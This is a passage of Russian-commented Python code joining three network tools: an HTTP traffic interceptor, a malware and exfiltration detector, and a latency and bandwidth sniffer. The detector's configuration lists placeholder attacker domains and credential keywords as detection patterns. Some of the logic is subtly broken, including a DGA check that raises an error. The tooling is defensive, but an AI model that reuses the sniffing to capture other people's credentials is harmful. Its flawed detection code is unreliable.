            headers = self.parse_headers(http_layer.response_headers)
            for name, value in headers.items():
                print(f"  {name}: {value}")

    @staticmethod
    def parse_headers(headers_str):
        """Разобрать строку заголовков в словарь"""
        headers = {}
        for line in headers_str.split('\r\n'):
            if ': ' in line:
                name, value = line.split(': ', 1)
                headers[name] = value
        return headers

def main():
    parser = argparse.ArgumentParser(
        description = "Утилита для перехвата и анализа HTTP трафика",
        formatter_class = argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("-i", "--interface", default = "eth0", help = "Сетевой интерфейс для перехвата")
    parser.add_argument("-o", "--output", help = "Файл для сохранения перехваченных данных")
    parser.add_argument("-f", "--filter", default = "http", help = "Фильтр захвата (BPF syntax)")
    
    args = parser.parse_args()
    
    analyzer = HTTPTrafficAnalyzer(
        interface = args.interface,
        output_file = args.output,
        filter_expr = args.filter
    )
    
    analyzer.start_capture()

if __name__ == "__main__":
    main()

# Установите необходимые зависимости: pip install pyshark colorama
# У вас должен быть установлен Wireshark/Tshark: python http_traffic_analyzer.py -i eth0 -f "http" -o capture.pcap

# ======================================================================================================================================

# Сетевой монитор для обнаружения вредоносного трафика
#!/usr/bin/env python3
import pyshark
from colorama import init, Fore, Style
import argparse
import re
from datetime import datetime
import json

# Инициализация цветного вывода
init(autoreset = True)

class NetworkMalwareDetector:
    def __init__(self, interface, config_file = 'config.json'):
        self.interface = interface
        self.suspicious_activities = []
        self.load_config(config_file)
        
    def load_config(self, config_file):
        """Загрузка конфигурации из JSON-файла"""
        try:
            with open(config_file) as f:
                config = json.load(f)
                self.keywords = config.get('sensitive_keywords', [])
                self.suspicious_domains = config.get('suspicious_domains', [])
                self.suspicious_ips = config.get('suspicious_ips', [])
                self.whitelist = config.get('whitelist', [])
                self.min_data_size = config.get('min_data_size', 100)
        except Exception as e:
            print(f"{Fore.RED}Ошибка загрузки конфигурации: {e}")
            # Значения по умолчанию
            self.keywords = ['password', 'credit_card', 'secret', 'token', 'api_key']
            self.suspicious_domains = ['malicious.com', 'exfiltrate.net']
            self.suspicious_ips = ['1.2.3.4', '5.6.7.8']
            self.whitelist = ['google.com', 'microsoft.com']
            self.min_data_size = 100

    def start_capture(self):
        """Начать захват и анализ трафика"""
        print(f"{Fore.GREEN}[*] Начало мониторинга трафика на интерфейсе {self.interface}")
        print(f"[*] Загружено {len(self.keywords)} ключевых слов, {len(self.suspicious_domains)} подозрительных доменов")
        print(f"[*] Минимальный размер данных для анализа: {self.min_data_size} байт{Style.RESET_ALL}\n")
        
        try:
            # Фильтр для захвата HTTP, HTTPS (по TLS-заголовкам), DNS и raw данных
            capture = pyshark.LiveCapture(
                interface = self.interface,
                display_filter = 'http or tls or dns or data',
                output_file = 'capture.pcap'
            )
            
            for packet in capture.sniff_continuously():
                self.analyze_packet(packet)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Остановлено пользователем{Style.RESET_ALL}")
            self.generate_report()
        except Exception as e:
            print(f"{Fore.RED}[!] Ошибка захвата: {e}{Style.RESET_ALL}")

    def analyze_packet(self, packet):
        """Анализировать сетевой пакет на подозрительную активность"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            src_ip = packet.ip.src if hasattr(packet, 'ip') else 'N/A'
            dst_ip = packet.ip.dst if hasattr(packet, 'ip') else 'N/A'
            
            # Проверка на подозрительные IP-адреса
            if src_ip in self.suspicious_ips or dst_ip in self.suspicious_ips:
                self.log_suspicious(f"Подозрительный IP: {src_ip} -> {dst_ip}", packet)
                return
            
            # Анализ HTTP трафика
            if hasattr(packet, 'http'):
                self.analyze_http(packet.http, src_ip, dst_ip, timestamp)
            
            # Анализ TLS/SSL трафика (HTTPS)
            elif hasattr(packet, 'tls'):
                self.analyze_tls(packet.tls, src_ip, dst_ip, timestamp)
            
            # Анализ DNS запросов
            elif hasattr(packet, 'dns'):
                self.analyze_dns(packet.dns, src_ip, dst_ip, timestamp)
            
            # Анализ raw данных
            elif hasattr(packet, 'data'):
                self.analyze_raw_data(packet.data, src_ip, dst_ip, timestamp)
                
        except AttributeError as e:
            pass  # Пропускаем пакеты без ожидаемых слоев

    def analyze_http(self, http_layer, src_ip, dst_ip, timestamp):
        """Анализ HTTP трафика"""
        # Проверка URL на подозрительные домены
        if hasattr(http_layer, 'host'):
            host = http_layer.host
            if any(re.search(domain, host, re.IGNORECASE) for domain in self.suspicious_domains):
                if host not in self.whitelist:
                    self.log_suspicious(f"Подозрительный HTTP домен: {host}", http_layer)
                    return
        
        # Проверка содержимого на ключевые слова
        if hasattr(http_layer, 'file_data'):
            data = http_layer.file_data.lower()
            self.check_for_sensitive_data(data, src_ip, dst_ip, "HTTP содержимое")

    def analyze_tls(self, tls_layer, src_ip, dst_ip, timestamp):
        """Анализ TLS трафика (HTTPS)"""
        # Проверка SNI (Server Name Indication) на подозрительные домены
        if hasattr(tls_layer, 'handshake_extensions_server_name'):
            sni = tls_layer.handshake_extensions_server_name.lower()
            if any(re.search(domain, sni, re.IGNORECASE) for domain in self.suspicious_domains):
                if sni not in self.whitelist:
                    self.log_suspicious(f"Подозрительный TLS SNI: {sni}", tls_layer)
                    return

    def analyze_dns(self, dns_layer, src_ip, dst_ip, timestamp):
        """Анализ DNS запросов"""
        if hasattr(dns_layer, 'qry_name'):
            query = dns_layer.qry_name.lower()
            # Проверка на DGA (Domain Generation Algorithm) паттерны
            if len(query.split('.'))[0] > 15 and any(c.isdigit() for c in query):
                self.log_suspicious(f"Возможный DGA домен: {query}", dns_layer)
                return
            
            # Проверка на подозрительные домены
            if any(re.search(domain, query, re.IGNORECASE) for domain in self.suspicious_domains):
                if query not in self.whitelist:
                    self.log_suspicious(f"Подозрительный DNS запрос: {query}", dns_layer)
                    return

    def analyze_raw_data(self, data_layer, src_ip, dst_ip, timestamp):
        """Анализ raw данных"""
        if hasattr(data_layer, 'data'):
            try:
                # Преобразование hex данных в строку
                data = bytes.fromhex(data_layer.data.replace(':', '')).decode('utf-8', errors = 'ignore').lower()
                
                # Проверка только если данных достаточно много
                if len(data) >= self.min_data_size:
                    self.check_for_sensitive_data(data, src_ip, dst_ip, "Raw данные")
            except:
                pass

    def check_for_sensitive_data(self, data, src_ip, dst_ip, context):
        """Проверить данные на наличие конфиденциальной информации"""
        found_keywords = [kw for kw in self.keywords if re.search(r'\b' + re.escape(kw) + r'\b', data, re.IGNORECASE)]
        
        if found_keywords:
            self.log_suspicious(
                f"Обнаружены конфиденциальные данные ({context}): {', '.join(found_keywords)}\n"
                f"Источник: {src_ip} -> Назначение: {dst_ip}",
                data[:200] + "..." if len(data) > 200 else data
            )

    def log_suspicious(self, message, packet_info):
        """Зарегистрировать подозрительную активность"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = {
            'timestamp': timestamp,
            'alert': message,
            'details': str(packet_info)
        }
        self.suspicious_activities.append(entry)
        
        print(f"{Fore.RED}[!] {timestamp} - {message}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Детали: {packet_info}{Style.RESET_ALL}\n")

    def generate_report(self):
        """Сгенерировать отчет о подозрительной активности"""
        if not self.suspicious_activities:
            print(f"{Fore.GREEN}[*] Подозрительная активность не обнаружена{Style.RESET_ALL}")
            return
        
        report_file = 'malware_detection_report.txt'
        with open(report_file, 'w') as f:
            f.write("Отчет об обнаружении вредоносной активности\n")
            f.write("="*50 + "\n\n")
            
            for i, activity in enumerate(self.suspicious_activities, 1):
                f.write(f"{i}. Время: {activity['timestamp']}\n")
                f.write(f"   Предупреждение: {activity['alert']}\n")
                f.write(f"   Детали: {activity['details']}\n\n")
        
        print(f"{Fore.GREEN}[*] Отчет сохранен в {report_file}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description = 'Сетевой монитор для обнаружения вредоносного трафика')
    parser.add_argument('-i', '--interface', default = 'eth0', help = 'Сетевой интерфейс для мониторинга')
    parser.add_argument('-c', '--config', default = 'config.json', help = 'Файл конфигурации')
    args = parser.parse_args()
    
    detector = NetworkMalwareDetector(args.interface, args.config)
    detector.start_capture()

if __name__ == '__main__':
    main()

# Конфигурационный файл (config.json)
{
    "sensitive_keywords": [
        "password",
        "credit_card",
        "secret",
        "token",
        "api_key",
        "login",
        "credentials",
        "ssn",
        "social security"
    ],
    "suspicious_domains": [
        "malicious\\.com",
        "exfiltrate\\.net",
        "evil\\.org",
        "command\\d+\\.cc"
    ],
    "suspicious_ips": [
        "1.2.3.4",
        "5.6.7.8",
        "10.0.0.\\d+"
    ],
    "whitelist": [
        "google.com",
        "microsoft.com",
        "windowsupdate.com"
    ],
    "min_data_size": 100
}

# становите необходимые зависимости: pip install pyshark colorama

# Установите Wireshark/Tshark:
# Для Ubuntu/Debian
# sudo apt install wireshark tshark

# Для CentOS/RHEL
# sudo yum install wireshark

# Дайте права на захват трафика:
# sudo usermod -aG wireshark $USER
# newgrp wireshark

# Использование
# Запуск с параметрами по умолчанию
# sudo python malware_detector.py

# Указание конкретного интерфейса и конфигурации
# sudo python malware_detector.py -i wlan0 -c my_config.json

# ==========================================================================================================================

# Установка зависимостей pip install scapy psutil
# Код инструмента (net_sniffer.py)
from scapy.all import sniff, IP, ICMP
import psutil
import threading
import time
import statistics
import os

ping_host = "8.8.8.8"
ping_count = 10
sniff_duration = 10  # секунд
packet_stats = []

def sniff_packets(duration):
    def packet_callback(packet):
        if IP in packet:
            packet_stats.append({
                'timestamp': time.time(),
                'len': len(packet),
                'src': packet[IP].src,
                'dst': packet[IP].dst
            })

    sniff(prn = packet_callback, timeout = duration, store = 0)

def ping_latency_and_loss(host, count):
    print(f"Пинг {host} ({count} пакетов)...")
    result = os.popen(f"ping -c {count} {host}").read()
    lines = result.split("\n")
    
    # Парсинг результата
    latency_values = []
    loss = 0.0
    for line in lines:
        if "time=" in line:
            try:
                time_str = line.split("time=")[1].split(" ")[0]
                latency_values.append(float(time_str))
            except:
                continue
        elif "packet loss" in line:
            try:
                loss_str = line.split(",")[2]
                loss = float(loss_str.strip().split("%")[0])
            except:
                continue
    return latency_values, loss

def get_bandwidth(bytes_transferred, duration):
    return (bytes_transferred * 8) / duration / 1024  # в кбит/с

def monitor_network_interface(duration):
    io_start = psutil.net_io_counters()
    time.sleep(duration)
    io_end = psutil.net_io_counters()
    bytes_sent = io_end.bytes_sent - io_start.bytes_sent
    bytes_recv = io_end.bytes_recv - io_start.bytes_recv
    return bytes_sent + bytes_recv

def main():
    print("Начат анализ сетевого соединения...\n")

    # Параллельный запуск сниффера
    sniff_thread = threading.Thread(target = sniff_packets, args = (sniff_duration,))
    sniff_thread.start()

    # Измерение пропускной способности
    bytes_transferred = monitor_network_interface(sniff_duration)

    # Ждём окончания сниффинга
    sniff_thread.join()

    # Пинг
    latencies, loss = ping_latency_and_loss(ping_host, ping_count)

    print("\n📊 Результаты анализа:")
    
    if latencies:
        print(f" - Средняя задержка: {statistics.mean(latencies):.2f} мс")
        print(f" - Минимальная/максимальная задержка: {min(latencies):.2f}/{max(latencies):.2f} мс")
    else:
        print(" - Не удалось измерить задержку.")

    print(f" - Потеря пакетов: {loss:.2f} %")

    bandwidth_kbps = get_bandwidth(bytes_transferred, sniff_duration)
    print(f" - Пропускная способность (приблизительно): {bandwidth_kbps:.2f} кбит/с")
    print(f" - Зафиксировано пакетов: {len(packet_stats)}")

if __name__ == "__main__":
    main()
